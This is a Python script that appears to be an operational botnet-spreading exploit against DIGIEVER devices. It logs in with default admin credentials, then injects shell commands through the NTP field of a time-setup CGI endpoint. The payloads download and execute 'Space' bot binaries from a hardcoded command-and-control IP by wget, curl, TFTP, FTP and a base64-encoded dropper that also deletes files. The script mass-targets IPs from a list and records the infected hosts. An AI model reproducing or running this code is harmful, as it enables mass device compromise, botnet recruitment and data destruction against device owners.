import threading
import httpx
import time
import subprocess
import os
import random
from queue import Queue
from concurrent.futures import ThreadPoolExecutor, as_completed
import resource

class Main:
    def __init__(self, ip):
        self.ip = ip.strip()
        self.c2_server = "72.62.37.166"
        self.c2_port = 3778
        
    def get_bot_count(self):
        """Check current bot count (for verification)"""
        try:
            result = subprocess.check_output(
                "ss -tnp | grep 3778 | grep ESTAB | wc -l",
                shell=True, text=True, timeout=2
            ).strip()
            return int(result) if result else 0
        except:
            return 0
    
    def login(self):
        try:
            limits = httpx.Limits(max_connections=100, max_keepalive_connections=20)
            with httpx.Client(
                verify=False, 
                timeout=30,
                follow_redirects=True,
                limits=limits,
                http1=True,
                http2=False
            ) as client:
                headers = {
                    "Host": self.ip,
                    "Content-Length": "127",
                    "Cache-Control": "max-age=0",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Upgrade-Insecure-Requests": "1",
                    "Origin": f"http://{self.ip}",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Referer": f"http://{self.ip}/",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Cookie": "PAGE=2; lang=en-us",
                    "Connection": "close"
                }
                login_data = "sUserName=admin&UserPassWD=admin&button0=Log+in&cgiName=login.cgi&page=%2Findex.htm&action=none&userName=admin&userPasswd=admin"
                
                time.sleep(random.uniform(0.01, 0.05))
                
                req = client.post(f"http://{self.ip}/login.cgi/cgi_main.cgi", 
                                 data=login_data, 
                                 headers=headers)
                
                if req.status_code == 200:
                    print(f"[+] Logged into {self.ip}")
                    self.exploit(client)
                else:
                    print(f"[-] Login failed {self.ip}: {req.status_code}")
                    
                req.close()
                
        except Exception as e:
            print(f"[!] Error with {self.ip}: {e}")

    def exploit(self, client):
        try:
            # ===== IMPROVED PAYLOADS =====
            payloads = [
                # Payload 1: Run 1.sh script (tries all architectures)
                f"cd /tmp; wget http://{self.c2_server}/1.sh -O- | sh; curl http://{self.c2_server}/1.sh | sh; busybox wget http://{self.c2_server}/1.sh -O- | sh",
                
                # Payload 2: Download architecture-specific binary
                f"cd /tmp; wget http://{self.c2_server}/hiddenbin/Space.$(uname -m) -O Space; chmod +x Space; ./Space; rm -rf Space",
                
                # Payload 3: Try x86_64 (most common)
                f"cd /tmp; wget http://{self.c2_server}/hiddenbin/Space.x86_64 -O Space; chmod +x Space; ./Space; rm -rf Space",
                
                # Payload 4: Try i686
                f"cd /tmp; wget http://{self.c2_server}/hiddenbin/Space.i686 -O Space; chmod +x Space; ./Space; rm -rf Space",
                
                # Payload 5: Try ARM
                f"cd /tmp; wget http://{self.c2_server}/hiddenbin/Space.arm -O Space; chmod +x Space; ./Space; rm -rf Space",
                
                # Payload 6: Try MIPS
                f"cd /tmp; wget http://{self.c2_server}/hiddenbin/Space.mips -O Space; chmod +x Space; ./Space; rm -rf Space",
                
                # Payload 7: Try ALL architectures (brute force)
                f"cd /tmp; for arch in x86_64 i686 arm mips mips64 ppc sparc sh4; do wget http://{self.c2_server}/hiddenbin/Space.$arch -O Space.$arch; chmod +x Space.$arch; ./Space.$arch; done; rm -rf Space*",
                
                # Payload 8: Use TFTP (common on embedded)
                f"cd /tmp; tftp {self.c2_server} -c get hiddenbin/Space; chmod +x Space; ./Space; rm -rf Space",
                
                # Payload 9: Use FTP
                f"cd /tmp; echo 'open {self.c2_server}\nuser anonymous pass\nbinary\nget hiddenbin/Space\nquit' | ftp -n; chmod +x Space; ./Space; rm -rf Space",
                
                # Payload 10: Echo + wget (if nothing else works)
                f"cd /tmp; echo 'IyEvYmluL2Jhc2gKd2dldCBodHRwOi8vNzIuNjIuMzcuMTY2LzEuc2ggLU8tIHwgc2gKY3VybCBodHRwOi8vNzIuNjIuMzcuMTY2LzEuc2ggfCBzaAp0ZnRwIC1yIDMuc2ggLWcgNzIuNjIuMzcuMTY2OyBzaCAzLnNoCnJtIC1yZiAqCg==' | base64 -d | sh",
            ]
            
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36',
                'Referer': f'http://{self.ip}/cfg_system_time.htm',
                'Accept': '*/*',
                'Upgrade-Insecure-Requests': '1',
                'Origin': f'http://{self.ip}',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US',
                'Connection': 'close'
            }
            
            bot_count_before = self.get_bot_count()
            
            for i, pay in enumerate(payloads, 1):
                try:
                    data = f"cgiName=time_tzsetup.cgi&page=%2Fcfg_system_time.htm&id=69&ntp=%60{pay}%60&ntp1=time.stdtime.gov.tw&ntp2=%60{pay}%60&isEnabled=0&timeDiff=%2B9&ntpAutoSync=1&ntpSyncMode=1&day=0&hour=0&min=0&syncDiff=30"
                    
                    req = client.post(f"http://{self.ip}/cgi-bin/cgi_main.cgi", 
                                     headers=headers, 
                                     data=data)
                    
                    if req.status_code == 200:
                        print(f"  [✓] Payload {i}/10 sent to {self.ip}")
                    else:
                        print(f"  [✗] Payload {i} failed on {self.ip}: {req.status_code}")
                    
                    req.close()
                    time.sleep(0.5)  # Small delay between payloads
                    
                except Exception as e:
                    print(f"  [!] Payload {i} error on {self.ip}: {e}")
            
            # Wait for bots to connect
            print(f"  [⏳] Waiting for {self.ip} to connect...")
            time.sleep(10)
            
            bot_count_after = self.get_bot_count()
            if bot_count_after > bot_count_before:
                print(f"  [✅] SUCCESS! {self.ip} added to botnet!")
                
                # Save to infected file
                with open("/root/infected.txt", "a") as f:
                    f.write(f"{self.ip}\n")
            else:
                print(f"  [❌] {self.ip} did not connect to C2")
                
        except Exception as e:
            print(f"[!] Exploit error for {self.ip}: {e}")

def increase_file_limit():
    """Increase system file descriptor limit"""
    try:
        resource.setrlimit(resource.RLIMIT_NOFILE, (65535, 65535))
        print(f"[✓] File limit: {resource.getrlimit(resource.RLIMIT_NOFILE)[0]}")
    except:
        print("[!] Could not increase file limit (run as root)")

def check_prerequisites():
    """Check if everything is ready"""
    print("\n" + "="*60)
    print(" DIGIEVER EXPLOIT - FIXED VERSION")
    print("="*60)
    
    # Check C2 connectivity
    try:
        subprocess.check_call(f"nc -zv {Main('').c2_server} {Main('').c2_port} -w 2", 
                            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"[✓] C2 server {Main('').c2_server}:{Main('').c2_port} is reachable")
    except:
        print(f"[⚠] C2 server {Main('').c2_server}:{Main('').c2_port} not reachable!")
    
    # Check bot binaries
    try:
        r = httpx.get(f"http://{Main('').c2_server}/1.sh", timeout=5)
        if r.status_code == 200:
            print(f"[✓] Bot binaries available at http://{Main('').c2_server}")
        else:
            print(f"[⚠] Bot binaries not found at http://{Main('').c2_server}")
    except:
        print(f"[⚠] Could not reach http://{Main('').c2_server}")

def worker(q):
    """Worker function for queue"""
    while not q.empty():
        try:
            ip = q.get_nowait()
            Main(ip).login()
        except:
            break
        finally:
            q.task_done()

if __name__ == "__main__":
    increase_file_limit()
    check_prerequisites()
    
    # Read IPs
    try:
        with open("digi.txt") as file:
            ips = [ip.strip() for ip in file.read().splitlines() if ip.strip()]
    except FileNotFoundError:
        print("[!] digi.txt not found!")
        exit(1)
    
    print(f"[📁] Loaded {len(ips)} targets")
    
    # ===== CONFIGURATION =====
    max_workers = 25  # Adjust based on your VPS
    use_queue = False  # Set True for queue mode, False for ThreadPool
    
    if use_queue:
        # Queue-based threading
        queue = Queue()
        for ip in ips:
            queue.put(ip)
        
        threads = []
        for i in range(max_workers):
            thread = threading.Thread(target=worker, args=(queue,))
            threads.append(thread)
            thread.start()
            time.sleep(0.1)
        
        for thread in threads:
            thread.join()
            
    else:
        # ThreadPoolExecutor (recommended)
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(Main(ip).login): ip for ip in ips}
            
            for i, future in enumerate(as_completed(futures), 1):
                ip = futures[future]
                try:
                    future.result()
                except Exception as e:
                    print(f"[!] {ip} failed: {e}")
                
                if i % 10 == 0:
                    print(f"\n[📊] Progress: {i}/{len(ips)}")
    
    print("\n" + "="*60)
    print("[✓] EXPLOIT COMPLETE")
    
    # Show final bot count
    try:
        bots = subprocess.check_output("ss -tnp | grep 3778 | grep ESTAB | wc -l", 
                                      shell=True, text=True).strip()
        print(f"[🤖] Total bots now: {bots}")
    except:
        pass
    print("="*60)